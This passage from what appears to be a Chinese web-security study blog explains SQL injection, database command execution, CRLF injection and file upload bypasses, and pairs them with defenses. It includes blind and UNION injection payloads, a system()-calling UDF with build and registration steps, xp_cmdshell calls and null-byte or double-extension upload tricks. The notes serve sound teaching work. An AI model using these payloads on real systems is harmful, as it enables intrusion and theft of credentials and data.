class="line">http://newspaper.com/items.php?id=2</span><br></pre></td></tr></table></figure><p>执行的SQL为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> title,description,bod <span class="keyword">from</span> items <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>假设黑客构造条件语句如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://newspaper.com/items.php?id=2 and 1=2</span><br></pre></td></tr></table></figure><p>此时执行的SQL如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select title,description,bod from items where id=2 and 1=2</span><br></pre></td></tr></table></figure><p>因为 <code>1=2</code> 永远是一个假命题，此时Web应用不会返回结果给用户，黑客看到的页面结果将为空或者是一个出错页面。</p><p>如果黑客继续构造请求</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://newspaper.com/items.php?id=2 and 1=1</span><br></pre></td></tr></table></figure><p>如果页面返回正常了，那么说明SQL语句的&quot;and&quot;成功执行。</p><p>此时可以判断“id”参数存在SQL注入漏洞。</p><p><strong>2）延时注入：攻击者通过引入延迟来推断数据库中的信息。</strong></p><p>利用 mysql 数据库中的 benchmark() 函数，用于测试函数性能，将表达式expr执行count次。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">benchmark(count,expr)</span><br></pre></td></tr></table></figure><p>构造payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1170</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> IF(<span class="built_in">SUBSTRING</span>(<span class="keyword">CURRENT</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span></span><br><span class="line"><span class="type">CHAR</span>(<span class="number">119</span>),BENCHMARK(<span class="number">5000000</span>,ENCODE(<span class="string">&#x27;MSG&#x27;</span>,<span class="string">&#x27;by 5 seconds&#x27;</span>)),<span class="keyword">null</span>) <span class="keyword">FROM</span> (<span class="keyword">Select</span> Database() <span class="keyword">as</span> <span class="keyword">current</span>) <span class="keyword">as</span> tbl;</span><br></pre></td></tr></table></figure><ul><li><code>IF(condition, true_value, false_value)</code>：这是一个条件判断语句。如果条件为真，则执行<code>true_value</code>，否则执行<code>false_value</code>。</li><li><code>SUBSTRING(CURRENT, 1, 1)</code>：SUBSTRING提取出CURRENT （从后面可以看出表示当前数据库名称）的第一个字符，判断它是不是CHAR(119)，即字母w</li><li><code>BENCHMARK(5000000, ENCODE('MSG', 'by 5 seconds'))</code>：如果条件为真的话，重复执行<code>BENCHMARK</code>函数造成延时，如果没有的话就会返回null</li></ul><p>这样可以根据页面回显的变化时间来判断数据库名称的第一个字符是不是 w，这样重复遍历可以将整个数据库名全部验证完成。</p><p>类似情况还可以获得有用信息的函数包含</p><ul><li>database()</li><li>system_user()：数据库系统用户</li><li>current_user()：登录数据库的当前用户</li><li>last_insert_id()</li></ul></li></ol><h1 id="数据库攻击技巧"><a class="markdownIt-Anchor" href="#数据库攻击技巧"></a> 数据库攻击技巧</h1><p><strong>找到SQL注入漏洞后</strong>，根据不同数据库，进行<strong>后续攻击</strong>的技巧也有所不同。</p><h2 id="常见攻击技巧"><a class="markdownIt-Anchor" href="#常见攻击技巧"></a> 常见攻击技巧</h2><p>下面一系列的操作比较繁琐，所以一般使用sqlmap进行自动化注入</p><ol><li><p><strong>猜解数据库版本</strong>：</p><p>因为知道了数据库的具体版本后，攻击者可以针对该版本已知的漏洞进行定向攻击。</p><p>MySQL版本如果是4，返回True</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.site.com<span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">5</span> <span class="keyword">and</span> <span class="built_in">substring</span>(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span></span><br></pre></td></tr></table></figure></li><li><p><strong>判断表名是否存在</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">5</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> admin</span><br></pre></td></tr></table></figure></li><li><p><strong>判断列名是否存在</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">5</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,passwd <span class="keyword">from</span> admin</span><br></pre></td></tr></table></figure></li><li><p><strong>猜测username和password具体值</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240805110109892.png" alt="image-20240805110109892" /></p></li><li><p><strong>读写文件</strong></p><p>如果当前数据库用户拥有读写系统相应文件或目录的权限</p><ul><li><p>在mysql中，可以通过Load_file()读取系统文件，通过into dumpfile写入系统文件，最后通过 LOAD DATA INFILE 将文件导入创建的表中，最后就可以通过一般的注入技巧直接操作表数据了。</p><blockquote><p>既然都可以读取系统文件了，为什么不直接读取或写入文件，而是导入表再操作呢：</p><ul><li>导入表中可以结构化处理，更加灵活</li><li>直接操作可能被安全防护机制如IDS检测到</li></ul></blockquote></li><li><p>写入文件技巧，通常被用于直接在服务器上写入一个Webshell，为进一步攻击做铺垫。因此，设计数据库安全方案时，可以禁止普通数据库用户具备操作文件的权限。</p></li></ul></li></ol><h2 id="命令执行"><a class="markdownIt-Anchor" href="#命令执行"></a> 命令执行</h2><ol><li><p><strong>命令执行方式</strong></p><ul><li>通过<strong>导出webshell</strong>间接地执行命令</li><li>利用<strong>用户自定义函数</strong>，即UDF（User-Defined Function）来执行命令。</li></ul></li><li><p><strong>UDF</strong></p><ul><li><p><strong>概念</strong></p><p><strong>流行的数据库一般都支持从本地文件系统中导入一个共享库文件作为自定义函数</strong></p><p>UDF 命令执行是一种利用数据库自定义函数进行代码执行的攻击方法。攻击者可以通过SQL注入或文件上传漏洞等手段将恶意的自定义函数（通常是用C语言编写的共享库）上传到服务器的数据库中。</p><p>一旦自定义函数被成功注册，用户就可以通过SQL语句调用这些函数来执行任意操作，包括在操作系统级别执行命令。</p></li><li><p><strong>具体例子</strong></p><p>这一整体的流程也已经被集成在了sqlmap上面</p><ul><li><p><strong>1）编写恶意UDF</strong></p><p>首先，攻击者需要编写一个恶意的共享库（通常使用C语言），该共享库实现自定义函数，这些函数可以执行操作系统命令。以下是一个简单的C语言UDF示例，展示了如何在Linux上执行系统命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sys_exec</span><span class="params">(<span class="type">char</span> *cmd)</span> &#123;</span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译此代码生成一个共享库，例如<code>libudf.so</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o libudf.so -fPIC udf.c</span><br></pre></td></tr></table></figure></li><li><p><strong>2）将UDF加载到数据库中</strong></p><p>攻击者需要将编译好的共享库文件上传到数据库服务器上，这通常可以通过SQL注入或文件上传漏洞实现。</p></li><li><p><strong>3）在数据库中创建和使用UDF</strong></p><p>接下来，攻击者需要在数据库中注册自定义函数。例如在MySQL中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- 创建一个存放UDF库文件的目录（如果没有权限，可以尝试其他可写目录）</span><br><span class="line">CREATE FUNCTION sys_exec RETURNS STRING SONAME <span class="string">&#x27;libudf.so&#x27;</span>;</span><br><span class="line"></span><br><span class="line">-- 调用自定义函数执行命令</span><br><span class="line">SELECT sys_exec(<span class="string">&#x27;id&#x27;</span>);  -- 在Linux系统上，这将执行<span class="string">&#x27;id&#x27;</span>命令并返回结果</span><br></pre></td></tr></table></figure></li><li><p><strong>4）执行系统命令</strong></p><p>一旦自定义函数被成功注册，攻击者可以通过SQL语句调用该函数来执行任意系统命令。</p></li></ul></li></ul></li></ol><h2 id="攻击存储过程"><a class="markdownIt-Anchor" href="#攻击存储过程"></a> 攻击存储过程</h2><ol><li><p><strong>什么是数据库存储过程（Stored Procedure）</strong></p><ul><li><p>SQL语句需要先编译再执行。而存储过程是一组为了完成特定功能的SQL语句集，经编译后存储在数据库中，用户通过指定存储过程的名字并给定参数（如果该存储过程带有参数）来调用执行它。</p></li><li><p>其实就是将sql查询语句封装成一个函数/对象的形式，可以直接调用该函数进行相应的查询。这样可以封装复杂的业务逻辑、提高性能、简化代码管理和提高安全性。</p></li></ul><blockquote><p>详细可见：<a href="https://blog.csdn.net/mocas_wang/article/details/109130271">数据库存储过程讲解与实例</a></p></blockquote></li><li><p><strong>利用存储过程进行攻击</strong></p><p>在 MS SQL Server中，可以利用存储过程 xp_cmdshell 执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.dbo.xp_cmdshell &#x27;ping &#x27;;</span><br><span class="line">EXEC master.dbo.xp_cmdshell &#x27;cmd.exe dir c:&#x27;;</span><br></pre></td></tr></table></figure><p>也可以利用 xp_regread 操作注册表</p><p>可以被利用的存储过程包括：</p><ul><li>xp_servicecontrol，允许用户启动、停止服务</li><li>xp_availablemedia，显示机器上有用的驱动器</li><li>xp_dirtree，允许获得一个目录树</li><li>xp_enumdsn，例句服务器上的ODBC数据源</li><li>xp_loginconfig，获取服务器安全信息</li><li>xp_makecab，允许用户在服务器上创建一个压缩文件</li><li>xp_ntsec_enumdomains，列举服务器可以进入的域</li><li>xp_terminate_process，提供进程ID，终止该进程</li></ul></li><li><p><strong>存储过程本身也可能存在漏洞</strong></p><p>有些自定义的存储过程也可能有注入漏洞，可能对外部传入的字段没有进行处理，造成SQL注入问题</p></li></ol><h2 id="编码问题"><a class="markdownIt-Anchor" href="#编码问题"></a> 编码问题</h2><p>当Web应用、数据库和操作系统使用不相同的字符集和编码，由于各层对字符的理解存在差异，可能会导致不同编码解释从而产生一些安全漏洞。</p><p><strong>具体例子</strong>：</p><ul><li><p>如果Web应用使用PHP处理用户输入，并且使用 <code>addslashes()</code> 函数来转义特殊字符（如单引号 <code>'</code> 等注入常用的闭合符号），则这些转义字符在存储到数据库之前会被加上反斜杠 <code>\</code> 。</p></li><li><p>如果数据库使用GBK编码（双字节字符集），某些字节序列会被解释为一个字符。例如，<code>0xBF27</code> 被解释为一个双字节字符。</p></li><li><p>攻击者可以输入 <code>0xBF27 or 1=1</code> ，经过 <code>addslashes()</code> 处理后，变成 <code>0xBF\27 or 1=1</code> 。在GBK编码中，<code>0xBF5C</code>（ <code>\</code> 的ASCII码是 <code>0x5C</code>）被解释为一个合法的双字节字符，从而吃掉了反斜杠，绕过了转义机制。</p></li></ul><h2 id="sql-column-truncation列截断"><a class="markdownIt-Anchor" href="#sql-column-truncation列截断"></a> SQL Column Truncation（列截断）</h2><ol><li><p><strong>基本概念</strong></p><p>SQL Column Truncation（列截断）是一种利用数据库列长度限制来进行攻击的技术。攻击者可以通过提供特定长度的输入，使数据库在插入或更新数据时对输入进行截断，从而引发潜在的安全问题。以下是对这种攻击方式的详细解释和示例。</p></li><li><p><strong>具体例子</strong></p><p>当 MYSQL 的 sql-mode 设置为 default 时，即没有开启 STRICT_ALL_TABLES 选项时，MYSQL对于用户插入的超长值只会提示 warning 而不是 error（error即插入不成功），仍然会插入数据，如果插入了两个相同的数据就可能会产生鉴权方面的问题。</p><ul><li><p><strong>正常业务</strong></p><p>假设有一个用户注册系统，数据库表定义如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> users (</span><br><span class="line">    username <span class="type">VARCHAR</span>(<span class="number">20</span>),</span><br><span class="line">    password <span class="type">VARCHAR</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>一个正常的注册请求可能是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users (username, password) <span class="keyword">VALUES</span> (<span class="string">&#x27;alice&#x27;</span>, <span class="string">&#x27;securepassword&#x27;</span>);</span><br></pre></td></tr></table></figure><p>在这种情况下，数据库会将用户名 <code>alice</code> 和密码 <code>securepassword</code> 存储在表中。</p></li><li><p><strong>攻击方法</strong></p><p>如果攻击者发现用户名字段的最大长度是20个字符，他们可以构造一个长度为20个字符的用户名，并在最后添加一个空格：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users (username, password) <span class="keyword">VALUES</span> (<span class="string">&#x27;admin               &#x27;</span>, <span class="string">&#x27;anypassword&#x27;</span>);</span><br></pre></td></tr></table></figure><p>数据库接收到上述请求后，由于<code>username</code>字段的长度限制是20个字符，数据库会截断用户名，存储为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;admin               &#x27;</span>  <span class="comment">-- 实际存储的用户名</span></span><br></pre></td></tr></table></figure><p>当攻击者尝试登录时，他们可以仅输入前缀匹配的用户名（例如，<code>admin</code>），数据库在处理查询时可能会忽略后面的空格，从而允许攻击者绕过验证。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;anypassword&#x27;</span>;</span><br></pre></td></tr></table></figure><p>如果后续授权过程中，系统仅仅通过用户名来进行授权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> ?</span><br></pre></td></tr></table></figure><p>我们注册的账号就直接拥有了管理员admin权限，产生了越权访问</p></li></ul></li></ol><h1 id="sql-注入防御"><a class="markdownIt-Anchor" href="#sql-注入防御"></a> SQL 注入防御</h1><h2 id="转义escape"><a class="markdownIt-Anchor" href="#转义escape"></a> 转义（escape）</h2><p><strong>escape的局限性</strong>：</p><p>仅仅对用户输入进行 escape（转义） 处理是不够的，escape采用的是黑名单机制，黑名单无法覆盖所有的过滤字符，用户输入的自然语言中也可能存在HAVING、ORDER BY等SQL保留字，盲目过滤可能导致误杀。</p><p><mark>基于黑名单的过滤方法并不合适</mark></p><h2 id="预编译"><a class="markdownIt-Anchor" href="#预编译"></a> 预编译</h2><ol><li><p><strong>基本概念</strong></p><p>通过将SQL查询与参数分离来确保用户输入不会被当作SQL代码执行。预编译的核心思想是<strong>将SQL查询的结构固定下来，而将用户输入的数据作为参数处理</strong>，从而避免恶意输入影响SQL查询的结构。</p><ul><li>一般来说，<strong>使用预编译语句是防御SQL注入的最佳方式</strong>，绑定变量保证了SQL语句的语义不会改变。</li></ul></li><li><p><strong>具体例子</strong></p><ul><li><p>PHP中使用预编译</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建数据库连接</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=testdb&#x27;</span>, <span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 准备SQL查询</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = :username AND password = :password&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定参数</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:username&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:password&#x27;</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置参数值</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行查询</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取查询结果</span></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>Java中使用预编译</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>;</span><br><span class="line">pstmt = conn.prepareStatement(sql);</span><br></pre></td></tr></table></figure><p>使用 <code>?</code> 表示变量</p></li></ul></li></ol><h2 id="使用安全的存储过程"><a class="markdownIt-Anchor" href="#使用安全的存储过程"></a> 使用安全的存储过程</h2><p>除了使用预编译语句外，我们还可以使用安全的存储过程对抗SQL注入。</p><p>使用存储过程的效果于使用预编译语句的效果类似，其区别就是存储过程需要先将SQL语句定义在数据库中。</p><p>但需要注意的是，</p><ul><li>存储过程中也可能会存在注入问题，因此应该尽量避免在存储过程内使用动态的SQL语句。</li><li>如果无法避免，则应该使用严格的过滤或者是编码函数来处理用户的输入数据。</li></ul><h2 id="检查数据类型"><a class="markdownIt-Anchor" href="#检查数据类型"></a> 检查数据类型</h2><p>对于输入的数据的数据类型进行检查，在很大程度上可以对抗SQL注入。</p><p>例如可以在代码中限制为 integer 类型，所以无法注入</p><p>但是如果需要用户提交的是一段字符串，单纯的数据类型检查就不够用了。</p><h2 id="使用安全函数"><a class="markdownIt-Anchor" href="#使用安全函数"></a> 使用安全函数</h2><p>一般来说，各种Web语言都实现了一些编码函数，可以帮助对抗SQL注入。</p><h2 id="数据库自身"><a class="markdownIt-Anchor" href="#数据库自身"></a> 数据库自身</h2><p>从数据库自身的就角度来说呢，应该使用最小权限原则，避免Web应用直接使用root，dbowner等高权限账户直接连接数据库。</p><p>如果有多个不同的应用在使用同一数据库，则也应该为每个应用分配不同的账户。</p><p>Web应用使用的数据库账户，不应该有创建自定义函数、操作本地文件的权限。</p><h1 id="其他注入攻击"><a class="markdownIt-Anchor" href="#其他注入攻击"></a> 其他注入攻击</h1><p>除了SQL注入以外，还有其他的注入攻击，这些攻击都是违背了“数据与代码分离”的原则。</p><h2 id="xml注入"><a class="markdownIt-Anchor" href="#xml注入"></a> XML注入</h2><p>XML是一种标准通用标记语言，通过标签对数据进行结构化表示，其注入方法也与HTML比较类似，主要都是通过闭合标签或者其他符号来完成注入的。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240805153609543.png" alt="image-20240805153609543" /></p><p>防御方法也与HTML注入类似，对语言本身的保留字符进行转义即可</p><h2 id="代码注入"><a class="markdownIt-Anchor" href="#代码注入"></a> 代码注入</h2><p>代码注入和命令注入往往都是由一些不安全的函数或者方法引起的，其中的典型代表就是eval()和systrm()。</p><p><strong>具体例子</strong></p><ul><li><p>PHP</p><p>下面这段php代码，从URL的查询参数中获取 <code>arg</code>的值，并将其赋值给变量<code>$x</code>，传递给 eval 函数执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$myvar</span>=<span class="string">&quot;varname&quot;</span>;</span><br><span class="line"><span class="variable">$x</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$myvar=<span class="subst">$x</span>;&quot;</span>);</span><br></pre></td></tr></table></figure><p>假设用户访问的URL是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?arg=1;phpinfo()</span><br></pre></td></tr></table></figure><p>服务器会执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;\$myvar=1;phpinfo();&quot;</span>);</span><br></pre></td></tr></table></figure><p>输出php的配置信息</p></li><li><p><strong>动态包含（Dynamic Include）</strong></p><p>动态包含是一种在程序运行时动态地包含和执行代码文件的技术。在PHP、JSP等编程语言中，动态包含通常用于在运行时根据条件或配置文件来加载不同的代码文件。然而，这种技术也可能导致代码注入或远程文件包含漏洞，从而使得攻击者能够执行恶意代码。</p><p>PHP、JSP的动态include导致的代码执行，都可以算是一种代码注入。</p><p>例如在JSP中，可以使用 <code>&lt;jsp:include&gt;</code> 标签来动态包含文件，或者使用 <code>RequestDispatcher</code> 类来实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:include page=<span class="string">&quot;&lt;%= request.getParameter(&quot;</span>page<span class="string">&quot;) %&gt;.jsp&quot;</span> /&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="crlf注入"><a class="markdownIt-Anchor" href="#crlf注入"></a> CRLF注入</h2><ol><li><p><strong>基本概念</strong></p><p>CR是指回车符 Carriage Return，即 <code>\r </code>。 LF是指换行符 Lined Feed，即 <code>\n</code> 。CRLF常被用作不同语义之间的分隔符，因此通过“注入CRLF字符”就有可能改变原有的语义。</p><ul><li>所有使用CRLF作为分隔符的地方都可能存在这种注入。</li></ul></li><li><p><strong>具体例子</strong></p><ul><li><p><strong>日志：登录失败用户名写入日志文件</strong></p><p>正常情况下的记录如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username login failed for: guest</span><br><span class="line">Username login failed for: admin</span><br></pre></td></tr></table></figure><p>如果没有处理&quot;\r\n&quot;，使用如下payload插入一条日志记录</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guest\nUsername login succeed for: admin</span><br></pre></td></tr></table></figure><p>结果日志变成。显然第二条记录是伪造的。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username login failed for: guest</span><br><span class="line">Username login succeed for: admin</span><br></pre></td></tr></table></figure></li><li><p><strong>http头部注入</strong></p><p>在HTTP协议中，HTTP头是通过“\r\n”来分隔的。</p><p>因此如果服务器端没有过滤“\r\n”，而又把用户输入的数据放在HTTP头中，则有可能导致安全隐患。这种在HTTP头中的CRLF注入，又可以称为“Http Response Splitting”。这种注入最常见的情况就是把用户的输入拼接到http response的头部中了。</p></li></ul></li><li><p><strong>防御</strong></p><p>对抗CRLF的方法非常简单。只需要处理好&quot;\r&quot;和&quot;\n&quot;这2个保留字，尤其是使用“换行符”作为分隔符的应用。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务端应用安全 </tag>
            
            <tag> 注入攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『文件上传漏洞』File Upload Vulnerabilities</title>
      <link href="/posts/4981.html"/>
      <url>/posts/4981.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h1><ol><li><p><strong>定义</strong></p><p>由于服务器对文件上传路径变量过滤不严，并且对用户上传的文件后缀以及文件类型限制不严，攻击者可通过 Web 访问的目录上传任意文件，包括网站后门文件（webshell），进而远程控制网站服务器。</p></li><li><p><strong>攻击条件</strong></p><ul><li>上传的文件能够被Web容器解释执行。上传后的目录是Web容器能覆盖的路径。</li><li>用户能够在Web上访问这个文件</li><li>上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则攻击不成功</li></ul></li><li><p><strong>绕过文件上传检查功能</strong></p><p><strong>1）通过判断文件后缀名完成上传文件安全检查</strong>：黑客可以手动修改上传过程的post包，在文件名后添加一个 <code>%00</code> 字节，截断某些函数对于文件名的判断。</p><p>例子：假设一个web应用仅允许上传 JPG ，例如可以通过手工修改post包，构造文件 <code>xxx.php[\0].jpg</code> 。对于Web应用来说，只会检查文件名的后缀是否符合要求，但是当文件上传到服务器后，服务器端的某些函数在处理文件名时，会将空字节之后的部分截断，因此最终存储在服务器上的文件变成了 <code>xxx.php</code>。攻击者可以利用这个文件执行任意PHP代码，达到攻击目的。</p><p><strong>2）判断上传文件的文件头</strong>：黑客可以伪造一个合法的文件头，把真实的PHP代码附在合法的文件头之后。但是注意这里文件的后缀需要是 <code>.php</code> ，因为后续仍然需要php来解释该文件，如果文件后缀名不是 <code>.php</code> 的话web服务器不会解析。</p></li></ol><h1 id="web服务器功能漏洞"><a class="markdownIt-Anchor" href="#web服务器功能漏洞"></a> Web服务器功能漏洞</h1><p>web服务器本身存在很多的功能特性，而这些功能特性可以被利用成漏洞进行攻击</p><ol><li><p><strong>Apache文件解析问题</strong></p><ul><li><strong>场景</strong>：在 <code>Apache 1.x</code> 和 <code>Apache 2.x</code> 环境中，当Apache遇到不认识的扩展名时（没有定义在其 <code>/conf/mime.types</code> 文件中），将会从后向前解析，直到碰到认识的扩展名。</li><li><strong>例子</strong>：例如文件名为1.php.aa，首先解析aa扩展名，发现不认识继续向前面遍历，最终识别为1.php。</li><li><strong>漏洞利用</strong>：Apache 并不认识 rar ，如果一个应用中要求用户上传rar，用户上传 <code>webshell.php.rar.rar</code>，可以通过安全检查，但实际容器中解析为PHP文件执行</li></ul></li><li><p><strong>IIS文件解析问题</strong></p><ul><li>场景：IIS是微软开发的一种web应用程序托管服务，曾出现过文件上传检查等问题</li></ul></li><li><p><strong>利用上传文件钓鱼</strong></p><p>黑客上传了一个bmp文件去正常的网站。然后传播这个合法图片的URL。</p><p>其实这个bmp文件中包含了恶意代码，指向钓鱼网站。</p></li></ol><h1 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h1><ol><li>文件上传的目录设置为不可执行<ul><li>只要web容器无法解析目录下的文件，即使攻击者上传了脚本文件，服务器也不会执行</li></ul></li><li>判断文件类型：结合使用MIME Type，后缀检查<ul><li>黑名单并不可行，使用白名单的方式</li><li>通过压缩函数处理图片，破坏图片中的HTML代码</li></ul></li><li>使用随机数改写文件名和文件路径<ul><li>在某些环境下，用户可以上传文件但并不能访问。可以使用随机数改写文件名和路径，使得用户无法访问到这个文件</li></ul></li><li>单独设置文件服务器的域名<ul><li>由于存在同源策略，一系列的客户端攻击失效。</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务端应用安全 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『Docker』Docker基础知识</title>
      <link href="/posts/9dd6.html"/>
      <url>/posts/9dd6.html</url>
      
